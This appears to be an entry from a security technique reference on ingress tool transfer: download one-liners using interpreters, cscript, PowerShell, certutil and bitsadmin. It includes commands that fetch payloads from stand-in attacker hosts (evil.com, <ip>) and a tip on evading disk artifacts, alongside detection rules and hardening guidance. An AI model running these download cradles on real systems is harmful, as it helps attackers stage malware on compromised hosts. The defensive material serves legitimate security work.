examples.label: Python3 fetch a script from your server

notes: When wget/curl are missing, use the language already on the box: python (urllib/requests), php (file_get_contents), ruby, perl, or a JS/vbs script on Windows. One of these is almost always present.
name: Transfer with Code - Download One-liners
description: When wget/curl are missing or blocked, any scripting interpreter can fetch a file. Handy for constrained or hardened hosts.

variations.label: Windows JScript / VBScript
variations.command:
cscript.exe /nologo wget.js https://<ip>/PowerView.ps1 PowerView.ps1
cscript.exe /nologo wget.vbs https://<ip>/PowerView.ps1 PowerView2.ps1

defense.why_it_works: Scripting-language one-liners (python urllib, php file_get_contents, ruby, perl) download files where dedicated tools are absent - handy on minimal or hardened hosts.
defense.prerequisites: Code execution and an interpreter (python/php/ruby/perl) present, with egress to the attacker host.
defense.impact: Files fetched using whatever interpreter is available, routing around missing/blocked download tools.
defense.detection: An interpreter process making an outbound HTTP connection is anomalous; command line (auditd/4688) shows the download one-liner; new file on disk; interpreter default UA.
defense.artifacts: python/php/etc. in process logs with a URL; an outbound connection from the interpreter; the downloaded file.
defense.prevention: [MITRE T1105 M1037 Filter Network Traffic] Use web content filtering to block risky file types (.exe) and whitelist domains (the module scenario shows GitHub/Dropbox/Drive blocked); [M1031 Network Intrusion Prevention] inspect and block transfers at IDS/IPS. Apply application control (WDAC/AppLocker) to block download cradles/LOLBins, and AV/EDR to catch known tooling.
defense.evasion: Pipe into the interpreter to avoid a disk artifact; set a UA where the language allows; use HTTPS and allowed domains.
defense.misconfiguration: Target systems allow arbitrary file downloads via curl, wget, certutil, bitsadmin, or PowerShell Invoke-WebRequest without application allowlisting or egress filtering. Attackers use these native tools (LOLBins) to fetch payloads from attacker-controlled servers, bypassing endpoint protection that might detect known malicious tool names.
defense.vulnerable_config:
# Living-off-the-land file download methods (all built into Windows/Linux):
# PowerShell (often bypasses older AV):
(New-Object Net.WebClient).DownloadFile('http://evil.com/shell.exe', 'C:\Temp\shell.exe')

# certutil (trusted Microsoft binary, often not blocked):
certutil -urlcache -split -f http://evil.com/payload.exe payload.exe

# bitsadmin (background transfer service):
bitsadmin /transfer myJob http://evil.com/shell.exe C:\Temp\shell.exe

# All of these bypass controls that only look for 'nc.exe', 'mimikatz.exe', etc.
defense.secure_config:
# Application allowlisting (most effective):
# Windows Defender Application Control (WDAC) or AppLocker
# Only signed, approved executables run
# Blocks dropping and running arbitrary payloads even via LOLBins

# PowerShell Constrained Language Mode + AMSI:
# GPO: PowerShell Execution Policy = AllSigned
# Blocks unsigned scripts; AMSI scans all scripts before execution

# Egress filtering — block outbound to unknown IPs:
# Web proxy with allowlist for legitimate update sources
# Alert on: certutil with -urlcache flag (Event 4688 + command line audit)
# Sysmon Rule: ProcessCreate where Image = certutil.exe and CommandLine contains 'urlcache'

# Network IDS: alert on HTTP/HTTPS downloads initiated by certutil, bitsadmin process
# Defender ATP: 'Suspicious process using Certutil to download content'
